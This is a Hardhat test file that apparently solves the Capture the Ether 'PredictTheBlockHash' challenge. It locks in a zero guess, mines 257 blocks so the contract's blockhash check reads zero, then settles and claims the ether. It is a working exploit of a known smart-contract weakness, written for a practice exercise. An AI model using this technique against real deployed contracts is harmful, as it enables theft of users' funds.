import { expect } from "chai";
import { ethers } from "hardhat";
const { mine } = require("@nomicfoundation/hardhat-network-helpers");

const { utils } = ethers;

describe("PredictTheBlockHashChallenge", () => {
  it("Solves the challenge", async () => {
    const value = utils.parseEther("1")

    const contractFactory = await ethers.getContractFactory("PredictTheBlockHashChallenge")
    const contract = await contractFactory.deploy({value})
    await contract.deployed()
    
    const tx = await contract.lockInGuess(utils.hexZeroPad('0x', 32), {value})
    await tx.wait()

    await mine(257)

    const settleTx = await contract.settle()
    await settleTx.wait()

    expect(await contract.isComplete()).to.be.true;
  });
});